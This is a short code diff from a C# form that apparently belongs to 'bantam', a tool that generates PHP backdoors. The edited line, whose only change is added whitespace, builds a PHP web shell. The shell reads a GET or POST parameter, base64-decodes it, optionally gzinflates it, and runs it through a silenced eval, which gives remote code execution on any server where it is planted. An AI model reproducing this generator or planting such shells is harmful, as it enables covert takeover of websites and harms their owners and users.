@@ -57,7 +57,7 @@ namespace bantam.Forms
 
             switch (backdoorType) {
                 case BackdoorTypes.EVAL: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(" + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])"+ gzInflateEnd + ");\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(" + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])" + gzInflateEnd + ");\r\n}";
                         break;
                     }
 
